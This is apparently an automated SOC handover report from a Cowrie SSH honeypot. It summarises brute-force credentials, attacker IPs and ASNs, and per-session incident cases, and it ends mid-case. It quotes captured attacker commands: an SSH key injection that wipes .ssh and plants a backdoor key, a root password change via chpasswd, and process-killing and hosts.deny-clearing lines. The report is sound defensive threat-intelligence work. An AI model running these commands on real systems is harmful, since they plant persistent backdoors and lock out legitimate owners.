# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-21 |
| **Generated At** | 2026-03-21T06:40:13Z |
| **Shift Time** | 06:40 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **313** |
| Confirmed Threats | **242** |
| False Positives Filtered | **71** (22.7%) |
| Unique Attacker IPs | **88** |
| Countries of Origin | **24** |
| High Severity Cases | **96** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **217** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **198** |
| Unique Credential Pairs | **151** |
| Unique Usernames | **77** |
| Unique Passwords | **128** |
| Successful Auth Pairs | **89** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 97 |
| `345gs5662d34` | 14 |
| `supervisor` | 2 |
| `default` | 2 |
| `support` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 14 |
| `3245gs5662d34` | 14 |
| `12345` | 11 |
| `password` | 7 |
| `1234` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 14 |
| `root` | `3245gs5662d34` | 14 |
| `root` | `123456Qwerty` | 3 |
| `root` | `159753` | 2 |
| `acer` | `acer@123` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123456Qwerty` | `139.224.131.169` | 2026-03-21T01:20:31 |
| `root` | `3245gs5662d34` | `139.224.131.169` | 2026-03-21T01:20:35 |
| `root` | `1020` | `47.238.91.108` | 2026-03-21T01:22:37 |
| `root` | `3245gs5662d34` | `47.238.91.108` | 2026-03-21T01:22:40 |
| `root` | `159753` | `218.26.205.154` | 2026-03-21T01:24:53 |
| `root` | `159753` | `187.49.63.41` | 2026-03-21T01:25:02 |
| `root` | `!@#abcABC123` | `47.238.91.108` | 2026-03-21T01:25:06 |
| `root` | `qwerty123456` | `112.102.48.129` | 2026-03-21T01:28:01 |
| `root` | `qwerty123456` | `218.206.136.24` | 2026-03-21T01:28:09 |
| `root` | `toor` | `60.174.39.82` | 2026-03-21T01:28:11 |
| `root` | `toor` | `65.181.79.60` | 2026-03-21T01:28:19 |
| `root` | `Root@2021` | `8.222.205.160` | 2026-03-21T01:28:39 |
| `root` | `3245gs5662d34` | `8.222.205.160` | 2026-03-21T01:28:42 |
| `root` | `deploy` | `148.227.90.210` | 2026-03-21T01:28:45 |
| `root` | `deploy` | `87.251.69.126` | 2026-03-21T01:28:56 |
| `root` | `112233` | `81.90.25.79` | 2026-03-21T01:29:28 |
| `root` | `1qaz@WSX1234` | `47.242.68.55` | 2026-03-21T01:29:45 |
| `root` | `3245gs5662d34` | `47.242.68.55` | 2026-03-21T01:29:48 |
| `root` | `123456Qwerty` | `8.222.205.160` | 2026-03-21T01:30:26 |
| `root` | `qwertyuiop` | `49.124.153.9` | 2026-03-21T01:31:33 |
| `root` | `66666666` | `222.216.2.74` | 2026-03-21T01:31:35 |
| `root` | `1234qwer!@#$` | `47.242.68.55` | 2026-03-21T01:31:39 |
| `root` | `66666666` | `110.39.181.194` | 2026-03-21T01:31:50 |
| `root` | `root999` | `171.233.91.172` | 2026-03-21T01:31:58 |
| `root` | `root999` | `113.176.216.199` | 2026-03-21T01:32:05 |
| `root` | `secret` | `218.15.224.102` | 2026-03-21T01:32:33 |
| `root` | `pa55w0rd` | `47.242.68.55` | 2026-03-21T01:33:31 |
| `root` | `root4` | `113.11.34.221` | 2026-03-21T01:35:08 |
| `root` | `root4` | `191.37.18.250` | 2026-03-21T01:35:22 |
| `root` | `Root@2021` | `47.238.247.149` | 2026-03-21T02:03:47 |
| `root` | `3245gs5662d34` | `47.238.247.149` | 2026-03-21T02:03:50 |
| `root` | `!Q@W#E4r5t6y` | `47.238.247.149` | 2026-03-21T02:04:33 |
| `root` | `123456Qwerty` | `47.238.247.149` | 2026-03-21T02:08:22 |
| `root` | `loki` | `47.238.247.149` | 2026-03-21T02:09:55 |
| `root` | `password` | `4.236.164.162` | 2026-03-21T02:16:15 |
| `root` | `1234` | `4.236.164.162` | 2026-03-21T02:20:59 |
| `root` | `123` | `4.236.164.162` | 2026-03-21T02:26:29 |
| `root` | `12345678` | `4.236.164.162` | 2026-03-21T02:32:36 |
| `root` | `12345` | `4.236.164.162` | 2026-03-21T02:38:30 |
| `root` | `admin` | `4.236.164.162` | 2026-03-21T02:44:26 |
| `root` | `qwerty` | `4.236.164.162` | 2026-03-21T02:50:33 |
| `root` | `ubuntu` | `4.236.164.162` | 2026-03-21T02:56:35 |
| `root` | `solana` | `4.236.164.162` | 2026-03-21T03:02:36 |
| `root` | `123456789` | `4.236.164.162` | 2026-03-21T03:08:42 |
| `root` | `admin123` | `4.236.164.162` | 2026-03-21T03:20:48 |
| `root` | `sol` | `4.236.164.162` | 2026-03-21T03:26:53 |
| `root` | `welcome` | `4.236.164.162` | 2026-03-21T03:33:04 |
| `root` | `P@ssw0rd` | `4.236.164.162` | 2026-03-21T03:39:28 |
| `root` | `111111` | `4.236.164.162` | 2026-03-21T03:45:30 |
| `root` | `password1` | `4.236.164.162` | 2026-03-21T03:51:46 |
| `root` | `passw0rd` | `4.236.164.162` | 2026-03-21T03:58:00 |
| `root` | `firedancer` | `4.236.164.162` | 2026-03-21T04:04:03 |
| `root` | `1q2w3e4r` | `4.236.164.162` | 2026-03-21T04:10:07 |
| `root` | `root111` | `182.227.214.33` | 2026-03-21T04:10:51 |
| `root` | `root111` | `178.178.194.137` | 2026-03-21T04:11:03 |
| `root` | `1234567` | `4.236.164.162` | 2026-03-21T04:16:15 |
| `root` | `Aa@123456` | `120.48.39.202` | 2026-03-21T04:19:03 |
| `root` | `abc123` | `4.236.164.162` | 2026-03-21T04:22:26 |
| `root` | `123123` | `4.236.164.162` | 2026-03-21T04:28:33 |
| `root` | `letmein` | `4.236.164.162` | 2026-03-21T04:34:47 |
| `root` | `solv` | `4.236.164.162` | 2026-03-21T04:41:03 |
| `root` | `root123` | `4.236.164.162` | 2026-03-21T04:47:13 |
| `root` | `1` | `4.236.164.162` | 2026-03-21T04:53:29 |
| `root` | `incorrect` | `34.93.128.179` | 2026-03-21T04:57:00 |
| `root` | `3245gs5662d34` | `34.93.128.179` | 2026-03-21T04:57:02 |
| `root` | `validator` | `4.236.164.162` | 2026-03-21T04:59:49 |
| `root` | `incorrect` | `172.214.209.153` | 2026-03-21T05:01:24 |
| `root` | `3245gs5662d34` | `172.214.209.153` | 2026-03-21T05:01:29 |
| `root` | `ubuntu` | `154.219.104.82` | 2026-03-21T05:01:59 |
| `root` | `1234567890` | `4.236.164.162` | 2026-03-21T05:06:06 |
| `root` | `raydium` | `4.236.164.162` | 2026-03-21T05:12:24 |
| `root` | `!P@ssw0rd` | `172.214.209.153` | 2026-03-21T05:17:36 |
| `root` | `123abc` | `4.236.164.162` | 2026-03-21T05:18:49 |
| `root` | `test` | `4.236.164.162` | 2026-03-21T05:25:39 |
| `root` | `root2025` | `102.90.34.90` | 2026-03-21T05:27:42 |
| `root` | `root2020` | `111.70.32.49` | 2026-03-21T05:29:07 |
| `root` | `qwerty123` | `4.236.164.162` | 2026-03-21T05:32:03 |
| `root` | `123qwe` | `4.236.164.162` | 2026-03-21T05:38:41 |
| `root` | `654321` | `4.236.164.162` | 2026-03-21T05:45:15 |
| `root` | `4rfv$RFV` | `4.236.164.162` | 2026-03-21T05:51:56 |
| `root` | `1234qwer` | `4.236.164.162` | 2026-03-21T05:58:31 |
| `root` | `user` | `4.236.164.162` | 2026-03-21T06:05:30 |
| `root` | `trader` | `4.236.164.162` | 2026-03-21T06:12:28 |
| `root` | `qwer1234` | `4.236.164.162` | 2026-03-21T06:19:02 |
| `root` | `pass123` | `4.236.164.162` | 2026-03-21T06:25:59 |
| `root` | `5` | `111.171.127.190` | 2026-03-21T06:27:19 |
| `root` | `root01` | `58.115.53.172` | 2026-03-21T06:28:37 |
| `root` | `root01` | `179.185.227.77` | 2026-03-21T06:28:49 |
| `root` | `123321` | `4.236.164.162` | 2026-03-21T06:32:35 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **15** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 14 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:cLobBfIIsAnS"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `47.238.91.108`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `47.242.68.55`, `47.238.247.149`, `8.222.205.160`, `172.214.209.153`, `139.224.131.169`, `34.93.128.179`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **88** |
| Unique ASNs | **56** |
| High-Risk ASNs | **46** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 6 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 5 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 5 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 4 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 4 | HIGH |
| `AS33765` | TANZANIA TELECOMMUNICATIONS CO. LTD | 4 | MEDIUM |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (94)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-cae4e82161ce

| Field | Detail |
|---|---|
| **Source IP** | `47.238.91[.]108` |
| **First Seen** | 2026-03-21 01:22 |
| **Last Seen** | 2026-03-21 01:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:22:37` | `cowrie.session.connect` |
| `2026-03-21 01:22:37` | `cowrie.client.version` |
| `2026-03-21 01:22:37` | `cowrie.client.kex` |
| `2026-03-21 01:22:37` | `cowrie.login.success` |
| `2026-03-21 01:22:37` | `cowrie.session.params` |
| `2026-03-21 01:22:37` | `cowrie.command.input` |
| `2026-03-21 01:22:37` | `cowrie.command.failed` |
| `2026-03-21 01:22:38` | `cowrie.log.closed` |
| `2026-03-21 01:22:38` | `cowrie.session.params` |
| `2026-03-21 01:22:38` | `cowrie.command.input` |
| `2026-03-21 01:22:38` | `cowrie.session.file_download` |
| `2026-03-21 01:22:38` | `cowrie.log.closed` |
| `2026-03-21 01:22:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.238.91[.]108` to AbuseIPDB if not already reported
- [ ] Block `47.238.91[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dd5e0810094

| Field | Detail |
|---|---|
| **Source IP** | `47.238.91[.]108` |
| **First Seen** | 2026-03-21 01:22 |
| **Last Seen** | 2026-03-21 01:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:22:40` | `cowrie.session.connect` |
| `2026-03-21 01:22:40` | `cowrie.client.version` |
| `2026-03-21 01:22:40` | `cowrie.client.kex` |
| `2026-03-21 01:22:40` | `cowrie.login.success` |
| `2026-03-21 01:22:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.238.91[.]108` to AbuseIPDB if not already reported
- [ ] Block `47.238.91[.]108` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3b8fc063d44

| Field | Detail |
|---|---|
| **Source IP** | `218.26.205[.]154` |
| **First Seen** | 2026-03-21 01:24 |
| **Last Seen** | 2026-03-21 01:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:24:50` | `cowrie.session.connect` |
| `2026-03-21 01:24:51` | `cowrie.client.version` |
| `2026-03-21 01:24:51` | `cowrie.client.kex` |
| `2026-03-21 01:24:53` | `cowrie.login.success` |
| `2026-03-21 01:24:54` | `cowrie.direct-tcpip.request` |
| `2026-03-21 01:24:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.26.205[.]154` to AbuseIPDB if not already reported
- [ ] Block `218.26.205[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b86871f8fb16

| Field | Detail |
|---|---|
| **Source IP** | `187.49.63[.]41` |
| **First Seen** | 2026-03-21 01:24 |
| **Last Seen** | 2026-03-21 01:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:24:59` | `cowrie.session.connect` |
| `2026-03-21 01:25:00` | `cowrie.client.version` |
| `2026-03-21 01:25:00` | `cowrie.client.kex` |
| `2026-03-21 01:25:02` | `cowrie.login.success` |
| `2026-03-21 01:25:02` | `cowrie.direct-tcpip.request` |
| `2026-03-21 01:25:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.49.63[.]41` to AbuseIPDB if not already reported
- [ ] Block `187.49.63[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1597f4c1ccb

| Field | Detail |
|---|---|
| **Source IP** | `47.238.91[.]108` |
| **First Seen** | 2026-03-21 01:25 |
| **Last Seen** | 2026-03-21 01:25 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:cLobBfIIsAnS"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:25:05` | `cowrie.session.connect` |
| `2026-03-21 01:25:05` | `cowrie.client.version` |
| `2026-03-21 01:25:05` | `cowrie.client.kex` |
| `2026-03-21 01:25:06` | `cowrie.login.success` |
| `2026-03-21 01:25:06` | `cowrie.session.params` |
| `2026-03-21 01:25:06` | `cowrie.command.input` |
| `2026-03-21 01:25:06` | `cowrie.command.failed` |
| `2026-03-21 01:25:06` | `cowrie.log.closed` |
| `2026-03-21 01:25:06` | `cowrie.session.params` |
| `2026-03-21 01:25:06` | `cowrie.command.input` |
| `2026-03-21 01:25:07` | `cowrie.session.file_download` |
| `2026-03-21 01:25:07` | `cowrie.log.closed` |
| `2026-03-21 01:25:19` | `cowrie.session.params` |
| `2026-03-21 01:25:19` | `cowrie.command.input` |
| `2026-03-21 01:25:19` | `cowrie.log.closed` |
| `2026-03-21 01:25:19` | `cowrie.session.params` |
| `2026-03-21 01:25:19` | `cowrie.command.input` |
| `2026-03-21 01:25:19` | `cowrie.log.closed` |
| `2026-03-21 01:25:19` | `cowrie.session.params` |
| `2026-03-21 01:25:19` | `cowrie.command.input` |
| `2026-03-21 01:25:19` | `cowrie.session.file_download` |
| `2026-03-21 01:25:19` | `cowrie.log.closed` |
| `2026-03-21 01:25:20` | `cowrie.session.params` |
| `2026-03-21 01:25:20` | `cowrie.command.input` |
| `2026-03-21 01:25:20` | `cowrie.log.closed` |
| `2026-03-21 01:25:20` | `cowrie.session.params` |
| `2026-03-21 01:25:20` | `cowrie.command.input` |
| `2026-03-21 01:25:20` | `cowrie.log.closed` |
| `2026-03-21 01:25:20` | `cowrie.session.params` |
| `2026-03-21 01:25:20` | `cowrie.command.input` |
| `2026-03-21 01:25:20` | `cowrie.command.input` |
| `2026-03-21 01:25:21` | `cowrie.log.closed` |
| `2026-03-21 01:25:21` | `cowrie.session.params` |
| `2026-03-21 01:25:21` | `cowrie.command.input` |
| `2026-03-21 01:25:21` | `cowrie.log.closed` |
| `2026-03-21 01:25:21` | `cowrie.session.params` |
| `2026-03-21 01:25:21` | `cowrie.command.input` |
| `2026-03-21 01:25:21` | `cowrie.log.closed` |
| `2026-03-21 01:25:22` | `cowrie.session.params` |
| `2026-03-21 01:25:22` | `cowrie.command.input` |
| `2026-03-21 01:25:22` | `cowrie.log.closed` |
| `2026-03-21 01:25:22` | `cowrie.session.params` |
| `2026-03-21 01:25:22` | `cowrie.command.input` |
| `2026-03-21 01:25:22` | `cowrie.log.closed` |
| `2026-03-21 01:25:22` | `cowrie.session.params` |
| `2026-03-21 01:25:22` | `cowrie.command.input` |
| `2026-03-21 01:25:22` | `cowrie.log.closed` |
| `2026-03-21 01:25:23` | `cowrie.session.params` |
| `2026-03-21 01:25:23` | `cowrie.command.input` |
| `2026-03-21 01:25:23` | `cowrie.log.closed` |
| `2026-03-21 01:25:23` | `cowrie.session.params` |
| `2026-03-21 01:25:23` | `cowrie.command.input` |
| `2026-03-21 01:25:23` | `cowrie.log.closed` |
| `2026-03-21 01:25:23` | `cowrie.session.params` |
| `2026-03-21 01:25:23` | `cowrie.command.input` |
| `2026-03-21 01:25:23` | `cowrie.log.closed` |
| `2026-03-21 01:25:24` | `cowrie.session.params` |
| `2026-03-21 01:25:24` | `cowrie.command.input` |
| `2026-03-21 01:25:24` | `cowrie.log.closed` |
| `2026-03-21 01:25:24` | `cowrie.session.params` |
| `2026-03-21 01:25:24` | `cowrie.command.input` |
| `2026-03-21 01:25:24` | `cowrie.log.closed` |
| `2026-03-21 01:25:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.238.91[.]108` to AbuseIPDB if not already reported
- [ ] Block `47.238.91[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d3aeb0455fd

| Field | Detail |
|---|---|
| **Source IP** | `112.102.48[.]129` |
| **First Seen** | 2026-03-21 01:27 |
| **Last Seen** | 2026-03-21 01:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:27:58` | `cowrie.session.connect` |
| `2026-03-21 01:27:59` | `cowrie.client.version` |
| `2026-03-21 01:27:59` | `cowrie.client.kex` |
| `2026-03-21 01:28:01` | `cowrie.login.success` |
| `2026-03-21 01:28:01` | `cowrie.direct-tcpip.request` |
| `2026-03-21 01:28:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.102.48[.]129` to AbuseIPDB if not already reported
- [ ] Block `112.102.48[.]129` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2de2b0e3e7df

| Field | Detail |
|---|---|
| **Source IP** | `218.206.136[.]24` |
| **First Seen** | 2026-03-21 01:28 |
| **Last Seen** | 2026-03-21 01:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:28:06` | `cowrie.session.connect` |
| `2026-03-21 01:28:07` | `cowrie.client.version` |
| `2026-03-21 01:28:07` | `cowrie.client.kex` |
| `2026-03-21 01:28:09` | `cowrie.login.success` |
| `2026-03-21 01:28:10` | `cowrie.direct-tcpip.request` |
| `2026-03-21 01:28:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.206.136[.]24` to AbuseIPDB if not already reported
- [ ] Block `218.206.136[.]24` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c5352061ebc

| Field | Detail |
|---|---|
| **Source IP** | `60.174.39[.]82` |
| **First Seen** | 2026-03-21 01:28 |
| **Last Seen** | 2026-03-21 01:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:28:09` | `cowrie.session.connect` |
| `2026-03-21 01:28:10` | `cowrie.client.version` |
| `2026-03-21 01:28:10` | `cowrie.client.kex` |
| `2026-03-21 01:28:11` | `cowrie.login.success` |
| `2026-03-21 01:28:12` | `cowrie.direct-tcpip.request` |
| `2026-03-21 01:28:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.174.39[.]82` to AbuseIPDB if not already reported
- [ ] Block `60.174.39[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed1efea33351

| Field | Detail |
|---|---|
| **Source IP** | `65.181.79[.]60` |
| **First Seen** | 2026-03-21 01:28 |
| **Last Seen** | 2026-03-21 01:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 01:28:17` | `cowrie.session.connect` |
| `2026-03-21 01:28:18` | `cowrie.client.version` |
| `2026-03-21 01:28:18` | `cowrie.client.kex` |
| `2026-03-21 01:28:19` | `cowrie.login.success` |
| `2026-03-21 01:28:20` | `cowrie.direct-tcpip.request` |
| `2026-03-21 01:28:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.181.79[.]60` to AbuseIPDB if not already reported
- [ ] Block `65.181.79[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5fde6de72b3

| Field | Detail |
|---|---|
| **Source IP** | `8.222.205[.]160` |
| **First Seen** | 2026-03-21 01:28 |
| **Last Seen** | 2026-03-21 01:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
